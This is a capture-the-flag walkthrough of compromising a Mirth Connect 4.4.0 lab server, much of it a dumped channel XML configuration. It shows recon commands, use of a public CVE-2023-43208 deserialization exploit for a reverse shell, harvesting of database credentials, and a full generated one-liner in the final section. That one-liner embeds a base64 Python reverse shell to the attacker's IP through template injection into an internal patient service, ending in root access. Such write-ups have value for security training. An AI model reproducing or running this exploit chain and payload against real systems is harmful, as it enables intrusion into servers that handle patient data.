![](Assets/Pasted%20image%2020260425141620.png)

## 1. Reconnaissance & Enumeration

First we make ping that we have connection

![](Assets/Pasted%20image%2020260425142258.png)

Then lets make a nmap `sudo nmap -sV -sC -sS --min-rate 500 10.129.45.119`

```bash
Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-25 14:16 -0600
Nmap scan report for 10.129.45.119
Host is up (0.080s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 07:eb:d1:b1:61:9a:6f:38:08:e0:1e:3e:5b:61:03:b9 (ECDSA)
|_  256 fc:d5:7a:ca:8c:4f:c1:bd:c7:2f:3a:ef:e1:5e:99:0f (ED25519)
80/tcp  open  http     Jetty
|_http-title: Mirth Connect Administrator
| http-methods: 
|_  Potentially risky methods: TRACE
443/tcp open  ssl/http Jetty
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Mirth Connect Administrator
| ssl-cert: Subject: commonName=mirth-connect
| Not valid before: 2025-09-19T12:50:05
|_Not valid after:  2075-09-19T12:50:05
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We, see a port `80` so we open the browser and put the ip

![](Assets/Pasted%20image%2020260427112302.png)

We can check the version fot nextgen. First we launch this command to see if it brings us the version

```bash
curl -k -s https://10.129.47.6/api/server/version
<html>
<head>
<meta http-equiv="Content-Type" content="text/html;charset=ISO-8859-1"/>
<title>Error 400 All requests must have &apos;X-Requested-With&apos; header</title>
</head>
<body><h2>HTTP ERROR 400 All requests must have &apos;X-Requested-With&apos; header</h2>
<table>
<tr><th>URI:</th><td>/api/server/version</td></tr>
<tr><th>STATUS:</th><td>400</td></tr>
<tr><th>MESSAGE:</th><td>All requests must have &apos;X-Requested-With&apos; header</td></tr>
<tr><th>SERVLET:</th><td>org.glassfish.jersey.servlet.ServletContainer-2176ac82</td></tr>
</table>
</body>
</html>
```

## 2. Vulnerability Discovery

Here we see that it does not bring us what we want but, we see that this header asks us `X-Requested-With`

Then we will do a second consultation.

```bash
curl -k -s -H "X-Requested-With: OpenAPI" https://10.129.47.6/api/server/version
4.4.0
```

Lets explain this:

`-k` This is your local security bypass. With -k, you tell curl: "I know this site is dangerous, don't validate the certificate, just let me through."

`-s`  Stealth mode. Normally curl prints you a progress bar, the download speed and the estimated time in the terminal. In Red Teaming, that only makes the screen dirty. The -s silences everything and gives you only what the server responds to.

`-H "X-Requested-With: OpenAPI"`  The lockpick for the chainman. As you discovered before, the Mirth Connect API rejects requests that do not have this specific header (a classic measure to avoid CSRF attacks and simple bots). With -H, we force curl to inject that exact line into the HTTP request, tricking the server into processing our command.

`https://10.129.47.6/api/server/version` The goal. We're not asking for the home page (/), we're pointing directly to the REST API endpoint that administrators use to check the system version.

Once we have the version, we will look for exploits for that version.

```text
NextGen Mirth Connect 4.4.0 release is vulnerable to unauthenticated remote code execution (RCE) due to flaws in handling deserialized data.

CVE-2023-43208: This is the current critical vulnerability that allows arbitrary code execution via malicious HTTP requests; was discovered by Horizon3.ai when finding a method to bypass the deny list implemented in the original patch.
```

So lets found a CVE with a python code [CVE-2023-43208][https://github.com/K3ysTr0K3R/CVE-2023-43208-EXPLOIT], I put the link of the person of the code that uses

For this I had to make some small changes, such as in requirements, remove the version from packaging, rich and adjust the version of setuptools `pip install "setuptools<70.0.0"`

Explotation Flow:

```
1. Send crafted XML to /api/users  
2. Server deserializes malicious object  
3. Gadget chain is triggered  
4. Runtime.exec() executes attacker-controlled command  
5. Reverse shell is obtained
```

Once with that we just run the script, with a terminal listening on port 4444

```bash
# Terminal 1
nc -lvnp 4444

# Terminal 2
python3 CVE-2023-43208.py -u https:<target-ip> -lh <machine-vpn-ip> -lp 4444
```

Once inside we execute commands to see where we are and what we have

```bash
nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.47.6 57040
pwd
/usr/local/mirthconnect
ls
client-lib
conf
custom-lib
docs
extensions
logs
mcserver
mcserver.vmoptions
mcservice
mcservice.vmoptions
mirth-server-launcher.jar
preferences
public_api_html
public_html
server-launcher-lib
server-lib
uninstall
webapps
whoami
mirth
```

Optional step if you want to improve your terminal run the following command in python

`python3 -c 'import pty; pty.spawn("/bin/bash")'`

Now you will see everything like a normal terminal:

`mirth@interpreter:/usr/local/mirthconnect$`

Well, as we saw in the `ls` command, we will inspect the conf file to see what it has with a `ls conf`,we see that there is a file called mirth.properties we inspect what it has and we see that it has some database credentials.

```bash
database.username = mirthdb
database.password = MirthPass123!
```

## 4. Privilege Escalation

With this we now connect to the database 

```bash
mysql -u mirthdb -p'MirthPass123!'

show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mc_bdd_prod        |
+--------------------+

ariaDB [(none)]> use mc_bdd_prod
use mc_bdd_prod
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [mc_bdd_prod]> show tables;
show tables;
+-----------------------+
| Tables_in_mc_bdd_prod |
+-----------------------+
| ALERT                 |
| CHANNEL               |
| CHANNEL_GROUP         |
| CODE_TEMPLATE         |
| CODE_TEMPLATE_LIBRARY |
| CONFIGURATION         |
| DEBUGGER_USAGE        |
| D_CHANNELS            |
| D_M1                  |
| D_MA1                 |
| D_MC1                 |
| D_MCM1                |
| D_MM1                 |
| D_MS1                 |
| D_MSQ1                |
| EVENT                 |
| PERSON                |
| PERSON_PASSWORD       |
| PERSON_PREFERENCE     |
| SCHEMA_INFO           |
| SCRIPT                |
+-----------------------+

```

I focuse in the table CHANNEL

```bash
<channel version="4.4.0">
  <id>24c915f9-d3e3-462a-a126-3511d3f3cd0a</id>
  <nextMetaDataId>2</nextMetaDataId>
  <name>INTERPRETER - HL7 TO XML TO NOTIFY</name>
  <description></description>
  <revision>5</revision>
  <sourceConnector version="4.4.0">
    <metaDataId>0</metaDataId>
    <name>sourceConnector</name>
    <properties class="com.mirth.connect.connectors.tcp.TcpReceiverProperties" version="4.4.0">
      <pluginProperties/>
      <listenerConnectorProperties version="4.4.0">
        <host>0.0.0.0</host>
        <port>6661</port>
      </listenerConnectorProperties>
      <sourceConnectorProperties version="4.4.0">
        <responseVariable>Auto-generate (After source transformer)</responseVariable>
        <respondAfterProcessing>true</respondAfterProcessing>
        <processBatch>false</processBatch>
        <firstResponse>true</firstResponse>
        <processingThreads>1</processingThreads>
        <resourceIds class="linked-hash-map">
          <entry>
            <string>Default Resource</string>
            <string>[Default Resource]</string>
          </entry>
        </resourceIds>
        <queueBufferSize>1000</queueBufferSize>
      </sourceConnectorProperties>
      <transmissionModeProperties class="com.mirth.connect.plugins.mllpmode.MLLPModeProperties">
        <pluginPointName>MLLP</pluginPointName>
        <startOfMessageBytes>0B</startOfMessageBytes>
        <endOfMessageBytes>1C0D</endOfMessageBytes>
        <useMLLPv2>false</useMLLPv2>
        <ackBytes>06</ackBytes>
        <nackBytes>15</nackBytes>
        <maxRetries>2</maxRetries>
      </transmissionModeProperties>
      <serverMode>true</serverMode>
      <remoteAddress></remoteAddress>
      <remotePort></remotePort>
      <overrideLocalBinding>false</overrideLocalBinding>
      <reconnectInterval>5000</reconnectInterval>
      <receiveTimeout>0</receiveTimeout>
      <bufferSize>65536</bufferSize>
      <maxConnections>10</maxConnections>
      <keepConnectionOpen>false</keepConnectionOpen>
      <dataTypeBinary>false</dataTypeBinary>
      <charsetEncoding>DEFAULT_ENCODING</charsetEncoding>
      <respondOnNewConnection>0</respondOnNewConnection>
      <responseAddress></responseAddress>
      <responsePort></responsePort>
    </properties>
    <transformer version="4.4.0">
      <elements>
        <com.mirth.connect.plugins.messagebuilder.MessageBuilderStep version="4.4.0">
          <name>TIMESTAMP</name>
          <sequenceNumber>0</sequenceNumber>
          <enabled>true</enabled>
          <messageSegment>tmp[&apos;timestamp&apos;]</messageSegment>
          <mapping>msg[&apos;MSH&apos;][&apos;MSH.7&apos;][&apos;MSH.7.1&apos;].toString()</mapping>
          <defaultValue></defaultValue>
          <replacements/>
        </com.mirth.connect.plugins.messagebuilder.MessageBuilderStep>
        <com.mirth.connect.plugins.messagebuilder.MessageBuilderStep version="4.4.0">
          <name>SENDER_APP</name>
          <sequenceNumber>1</sequenceNumber>
          <enabled>true</enabled>
          <messageSegment>tmp[&apos;sender_app&apos;]</messageSegment>
          <mapping>msg[&apos;MSH&apos;][&apos;MSH.3&apos;][&apos;MSH.3.1&apos;].toString()</mapping>
          <defaultValue></defaultValue>
          <replacements/>
        </com.mirth.connect.plugins.messagebuilder.MessageBuilderStep>
        <com.mirth.connect.plugins.messagebuilder.MessageBuilderStep version="4.4.0">
          <name>ID</name>
          <sequenceNumber>2</sequenceNumber>
          <enabled>true</enabled>
          <messageSegment>tmp[&apos;id&apos;]</messageSegment>
          <mapping>msg[&apos;PID&apos;][&apos;PID.3&apos;][&apos;PID.3.1&apos;].toString()</mapping>
          <defaultValue></defaultValue>
          <replacements/>
        </com.mirth.connect.plugins.messagebuilder.MessageBuilderStep>
        <com.mirth.connect.plugins.messagebuilder.MessageBuilderStep version="4.4.0">
          <name>FIRSTNAME</name>
          <sequenceNumber>3</sequenceNumber>
          <enabled>true</enabled>
          <messageSegment>tmp[&apos;firstname&apos;]</messageSegment>
          <mapping>msg[&apos;PID&apos;][&apos;PID.5&apos;][&apos;PID.5.2&apos;].toString()</mapping>
          <defaultValue></defaultValue>
          <replacements/>
        </com.mirth.connect.plugins.messagebuilder.MessageBuilderStep>
        <com.mirth.connect.plugins.messagebuilder.MessageBuilderStep version="4.4.0">
          <name>LASTNAME</name>
          <sequenceNumber>4</sequenceNumber>
          <enabled>true</enabled>
          <messageSegment>tmp[&apos;lastname&apos;]</messageSegment>
          <mapping>msg[&apos;PID&apos;][&apos;PID.5&apos;][&apos;PID.5.1&apos;].toString()</mapping>
          <defaultValue></defaultValue>
          <replacements/>
        </com.mirth.connect.plugins.messagebuilder.MessageBuilderStep>
        <com.mirth.connect.plugins.messagebuilder.MessageBuilderStep version="4.4.0">
          <name>BIRTH_DATE</name>
          <sequenceNumber>5</sequenceNumber>
          <enabled>true</enabled>
          <messageSegment>tmp[&apos;birth_date&apos;]</messageSegment>
          <mapping>date_conversion(msg[&apos;PID&apos;][&apos;PID.7&apos;][&apos;PID.7.1&apos;].toString())</mapping>
          <defaultValue></defaultValue>
          <replacements/>
        </com.mirth.connect.plugins.messagebuilder.MessageBuilderStep>
        <com.mirth.connect.plugins.messagebuilder.MessageBuilderStep version="4.4.0">
          <name>GENDER</name>
          <sequenceNumber>6</sequenceNumber>
          <enabled>true</enabled>
          <messageSegment>tmp[&apos;gender&apos;]</messageSegment>
          <mapping>msg[&apos;PID&apos;][&apos;PID.8&apos;][&apos;PID.8.1&apos;].toString()</mapping>
          <defaultValue></defaultValue>
          <replacements/>
        </com.mirth.connect.plugins.messagebuilder.MessageBuilderStep>
      </elements>
      <inboundTemplate encoding="base64">TVNIfF5+XFwmfFdFQkFQUHxJTlRFUlBSRVRFUnxNSVJUSHxJTlRFUlBSRVRFUnxUSU1FU1RBTVB8fEFEVF5BMDF8fFB8Mi41ClBJRHwxfHxQQVRJRU5USUReXl5JTlRFUlBSRVRFUnx8TEFTVE5BTUVeRklSU1ROQU1FfHxEQVRFT0ZCSVJUSHxHRU5ERVI=</inboundTemplate>
      <outboundTemplate encoding="base64">PHBhdGllbnQ+CiAgPHRpbWVzdGFtcD48L3RpbWVzdGFtcD4KICA8c2VuZGVyX2FwcD48L3NlbmRlcl9hcHA+CiAgPGlkPjwvaWQ+CiAgPGZpcnN0bmFtZT48L2ZpcnN0bmFtZT4KICA8bGFzdG5hbWU+PC9sYXN0bmFtZT4KICA8YmlydGhfZGF0ZT48L2JpcnRoX2RhdGU+CiAgPGdlbmRlcj48L2dlbmRlcj4KPC9wYXRpZW50Pg==</outboundTemplate>
      <inboundDataType>HL7V2</inboundDataType>
      <outboundDataType>XML</outboundDataType>
      <inboundProperties class="com.mirth.connect.plugins.datatypes.hl7v2.HL7v2DataTypeProperties" version="4.4.0">
        <serializationProperties class="com.mirth.connect.plugins.datatypes.hl7v2.HL7v2SerializationProperties" version="4.4.0">
          <handleRepetitions>true</handleRepetitions>
          <handleSubcomponents>true</handleSubcomponents>
          <useStrictParser>false</useStrictParser>
          <useStrictValidation>false</useStrictValidation>
          <stripNamespaces>false</stripNamespaces>
          <segmentDelimiter>\r</segmentDelimiter>
          <convertLineBreaks>true</convertLineBreaks>
        </serializationProperties>
        <deserializationProperties class="com.mirth.connect.plugins.datatypes.hl7v2.HL7v2DeserializationProperties" version="4.4.0">
          <useStrictParser>false</useStrictParser>
          <useStrictValidation>false</useStrictValidation>
          <segmentDelimiter>\r</segmentDelimiter>
        </deserializationProperties>
        <batchProperties class="com.mirth.connect.plugins.datatypes.hl7v2.HL7v2BatchProperties" version="4.4.0">
          <splitType>MSH_Segment</splitType>
          <batchScript></batchScript>
        </batchProperties>
        <responseGenerationProperties class="com.mirth.connect.plugins.datatypes.hl7v2.HL7v2ResponseGenerationProperties" version="4.4.0">
          <segmentDelimiter>\r</segmentDelimiter>
          <successfulACKCode>AA</successfulACKCode>
          <successfulACKMessage></successfulACKMessage>
          <errorACKCode>AE</errorACKCode>
          <errorACKMessage>An Error Occurred Processing Message.</errorACKMessage>
          <rejectedACKCode>AR</rejectedACKCode>
          <rejectedACKMessage>Message Rejected.</rejectedACKMessage>
          <msh15ACKAccept>false</msh15ACKAccept>
          <dateFormat>yyyyMMddHHmmss.SSS</dateFormat>
        </responseGenerationProperties>
        <responseValidationProperties class="com.mirth.connect.plugins.datatypes.hl7v2.HL7v2ResponseValidationProperties" version="4.4.0">
          <successfulACKCode>AA,CA</successfulACKCode>
          <errorACKCode>AE,CE</errorACKCode>
          <rejectedACKCode>AR,CR</rejectedACKCode>
          <validateMessageControlId>true</validateMessageControlId>
          <originalMessageControlId>Destination_Encoded</originalMessageControlId>
          <originalIdMapVariable></originalIdMapVariable>
        </responseValidationProperties>
      </inboundProperties>
      <outboundProperties class="com.mirth.connect.plugins.datatypes.xml.XMLDataTypeProperties" version="4.4.0">
        <serializationProperties class="com.mirth.connect.plugins.datatypes.xml.XMLSerializationProperties" version="4.4.0">
          <stripNamespaces>false</stripNamespaces>
        </serializationProperties>
        <batchProperties class="com.mirth.connect.plugins.datatypes.xml.XMLBatchProperties" version="4.4.0">
          <splitType>Element_Name</splitType>
          <elementName></elementName>
          <level>1</level>
          <query></query>
          <batchScript></batchScript>
        </batchProperties>
      </outboundProperties>
    </transformer>
    <filter version="4.4.0">
      <elements/>
    </filter>
    <transportName>TCP Listener</transportName>
    <mode>SOURCE</mode>
    <enabled>true</enabled>
    <waitForPrevious>true</waitForPrevious>
  </sourceConnector>
  <destinationConnectors>
    <connector version="4.4.0">
      <metaDataId>1</metaDataId>
      <name>Destination 1</name>
      <properties class="com.mirth.connect.connectors.http.HttpDispatcherProperties" version="4.4.0">
        <pluginProperties/>
        <destinationConnectorProperties version="4.4.0">
          <queueEnabled>false</queueEnabled>
          <sendFirst>false</sendFirst>
          <retryIntervalMillis>10000</retryIntervalMillis>
          <regenerateTemplate>false</regenerateTemplate>
          <retryCount>0</retryCount>
          <rotate>false</rotate>
          <includeFilterTransformer>false</includeFilterTransformer>
          <threadCount>1</threadCount>
          <threadAssignmentVariable></threadAssignmentVariable>
          <validateResponse>false</validateResponse>
          <resourceIds class="linked-hash-map">
            <entry>
              <string>Default Resource</string>
              <string>[Default Resource]</string>
            </entry>
          </resourceIds>
          <queueBufferSize>1000</queueBufferSize>
          <reattachAttachments>true</reattachAttachments>
        </destinationConnectorProperties>
        <host>http://127.0.0.1:54321/addPatient</host>
        <useProxyServer>false</useProxyServer>
        <proxyAddress></proxyAddress>
        <proxyPort></proxyPort>
        <method>post</method>
        <headers class="linked-hash-map"/>
        <parameters class="linked-hash-map"/>
        <useHeadersVariable>false</useHeadersVariable>
        <headersVariable></headersVariable>
        <useParametersVariable>false</useParametersVariable>
        <parametersVariable></parametersVariable>
        <responseXmlBody>false</responseXmlBody>
        <responseParseMultipart>true</responseParseMultipart>
        <responseIncludeMetadata>false</responseIncludeMetadata>
        <responseBinaryMimeTypes>application/.*(?&lt;!json|xml)$|image/.*|video/.*|audio/.*</responseBinaryMimeTypes>
        <responseBinaryMimeTypesRegex>true</responseBinaryMimeTypesRegex>
        <multipart>false</multipart>
        <useAuthentication>false</useAuthentication>
        <authenticationType>Basic</authenticationType>
        <usePreemptiveAuthentication>false</usePreemptiveAuthentication>
        <username></username>
        <password></password>
        <content>${message.encodedData}</content>
        <contentType>text/plain</contentType>
        <dataTypeBinary>false</dataTypeBinary>
        <charset>UTF-8</charset>
        <socketTimeout>30000</socketTimeout>
      </properties>
      <transformer version="4.4.0">
        <elements/>
        <inboundTemplate encoding="base64"></inboundTemplate>
        <outboundTemplate encoding="base64"></outboundTemplate>
        <inboundDataType>XML</inboundDataType>
        <outboundDataType>XML</outboundDataType>
        <inboundProperties class="com.mirth.connect.plugins.datatypes.xml.XMLDataTypeProperties" version="4.4.0">
          <serializationProperties class="com.mirth.connect.plugins.datatypes.xml.XMLSerializationProperties" version="4.4.0">
            <stripNamespaces>false</stripNamespaces>
          </serializationProperties>
          <batchProperties class="com.mirth.connect.plugins.datatypes.xml.XMLBatchProperties" version="4.4.0">
            <splitType>Element_Name</splitType>
            <elementName></elementName>
            <level>1</level>
            <query></query>
            <batchScript></batchScript>
          </batchProperties>
        </inboundProperties>
        <outboundProperties class="com.mirth.connect.plugins.datatypes.xml.XMLDataTypeProperties" version="4.4.0">
          <serializationProperties class="com.mirth.connect.plugins.datatypes.xml.XMLSerializationProperties" version="4.4.0">
            <stripNamespaces>false</stripNamespaces>
          </serializationProperties>
          <batchProperties class="com.mirth.connect.plugins.datatypes.xml.XMLBatchProperties" version="4.4.0">
            <splitType>Element_Name</splitType>
            <elementName></elementName>
            <level>1</level>
            <query></query>
            <batchScript></batchScript>
          </batchProperties>
        </outboundProperties>
      </transformer>
      <responseTransformer version="4.4.0">
        <elements/>
        <inboundDataType>XML</inboundDataType>
        <outboundDataType>XML</outboundDataType>
        <inboundProperties class="com.mirth.connect.plugins.datatypes.xml.XMLDataTypeProperties" version="4.4.0">
          <serializationProperties class="com.mirth.connect.plugins.datatypes.xml.XMLSerializationProperties" version="4.4.0">
            <stripNamespaces>false</stripNamespaces>
          </serializationProperties>
          <batchProperties class="com.mirth.connect.plugins.datatypes.xml.XMLBatchProperties" version="4.4.0">
            <splitType>Element_Name</splitType>
            <elementName></elementName>
            <level>1</level>
            <query></query>
            <batchScript></batchScript>
          </batchProperties>
        </inboundProperties>
        <outboundProperties class="com.mirth.connect.plugins.datatypes.xml.XMLDataTypeProperties" version="4.4.0">
          <serializationProperties class="com.mirth.connect.plugins.datatypes.xml.XMLSerializationProperties" version="4.4.0">
            <stripNamespaces>false</stripNamespaces>
          </serializationProperties>
          <batchProperties class="com.mirth.connect.plugins.datatypes.xml.XMLBatchProperties" version="4.4.0">
            <splitType>Element_Name</splitType>
            <elementName></elementName>
            <level>1</level>
            <query></query>
            <batchScript></batchScript>
          </batchProperties>
        </outboundProperties>
      </responseTransformer>
      <filter version="4.4.0">
        <elements/>
      </filter>
      <transportName>HTTP Sender</transportName>
      <mode>DESTINATION</mode>
      <enabled>true</enabled>
      <waitForPrevious>true</waitForPrevious>
    </connector>
  </destinationConnectors>
  <preprocessingScript>// Modify the message variable below to pre process data
return message;</preprocessingScript>
  <postprocessingScript>// This script executes once after a message has been processed
// Responses returned from here will be stored as &quot;Postprocessor&quot; in the response map
return;</postprocessingScript>
  <deployScript>// This script executes once when the channel is deployed
// You only have access to the globalMap and globalChannelMap here to persist data
return;</deployScript>
  <undeployScript>// This script executes once when the channel is undeployed
// You only have access to the globalMap and globalChannelMap here to persist data
return;</undeployScript>
  <properties version="4.4.0">
    <clearGlobalChannelMap>true</clearGlobalChannelMap>
    <messageStorageMode>DISABLED</messageStorageMode>
    <encryptData>false</encryptData>
    <encryptAttachments>false</encryptAttachments>
    <encryptCustomMetaData>false</encryptCustomMetaData>
    <removeContentOnCompletion>false</removeContentOnCompletion>
    <removeOnlyFilteredOnCompletion>false</removeOnlyFilteredOnCompletion>
    <removeAttachmentsOnCompletion>false</removeAttachmentsOnCompletion>
    <initialState>STARTED</initialState>
    <storeAttachments>false</storeAttachments>
    <metaDataColumns>
      <metaDataColumn>
        <name>SOURCE</name>
        <type>STRING</type>
        <mappingName>mirth_source</mappingName>
      </metaDataColumn>
      <metaDataColumn>
        <name>TYPE</name>
        <type>STRING</type>
        <mappingName>mirth_type</mappingName>
      </metaDataColumn>
    </metaDataColumns>
    <attachmentProperties version="4.4.0">
      <type>None</type>
      <properties/>
    </attachmentProperties>
    <resourceIds class="linked-hash-map">
      <entry>
        <string>Default Resource</string>
        <string>[Default Resource]</string>
      </entry>
    </resourceIds>
  </properties>
</channel> 
```

After reading the entire text and passing it to the AI ​​we concluded that there was something strange in a request to a localhost `<host>http://127.0.0.1:54321/addPatient</host>`

To compromise the hidden web service that processes patients, a payload generator script was developed that automates a Server Side Template Injection (SSTI)/Remote Code Execution (RCE) attack via a local request.

The attack is divided into the following technical phases:

```text
1. Generation of the Reverse Shell: A standard payload is created in Python (socket, os, pty) configured with the IP and port of the attacker.

2. Filter Evasion (Base64): The payload is encoded in Base64 to be able to embed it cleanly within an XML structure, preventing special characters (quotes, parentheses) from breaking the format expected by the server.

3. SSTI Injection (The Trigger): Base64 code is embedded within the <firstname> XML tag using the template evaluation syntax {{exec(...)}. This forces the vulnerable backend to decode Base64 and execute the shell directly in system memory.

4. Local Delivery (Local SSRF): The script ends by delivering a Python one-liner. Running this command in the victim's initial session makes an internal POST request to http://127.0.0.1:54321/addPatient sending the malicious XML. This allows you to interact with the closed port and evade the restrictions of the external firewall, triggering the reverse shell.
```

The code can be found here in `generate_payload.py`

```bash
python generate_payload.py
--- Reverse Shell Payload Generator ---
Input Target IP: 10.10.14.97
Input Target Port: 5555

==================================================
Generated Payload:
==================================================
python3 -c 'import urllib.request; b64="aW1wb3J0IHNvY2tldCxvcyxwdHk7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMTAuMTAuMTQuOTciLDU1NTUpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7b3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtwdHkuc3Bhd24oIi9iaW4vYmFzaCIp"; inj="{exec(__import__(\"base64\").b64decode(\"aW1wb3J0IHNvY2tldCxvcyxwdHk7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMTAuMTAuMTQuOTciLDU1NTUpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7b3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtwdHkuc3Bhd24oIi9iaW4vYmFzaCIp\").decode())}"; xml="<patient><firstname>"+inj+"</firstname><lastname>Doe</lastname><timestamp>2026</timestamp><sender_app>P</sender_app><id>1</id><birth_date>01/01/1990</birth_date><gender>M</gender></patient>"; req=urllib.request.Request("http://127.0.0.1:54321/addPatient",data=xml.encode(),headers={"Content-Type":"application/xml"}); urllib.request.urlopen(req)'
==================================================
```

Then you need to copy this payload in the terminal and open other terminal with `nc -lvnp 5555`

```bash
nc -lvnp 5555
Listening on 0.0.0.0 5555
Connection received on 10.129.47.6 46756
root@interpreter:/usr/local/bin# whoami
whoami
root
```

We Will Got ROOT NOW !!!!!!!!!!!!!!!!!!!!!!!! then you can see all flag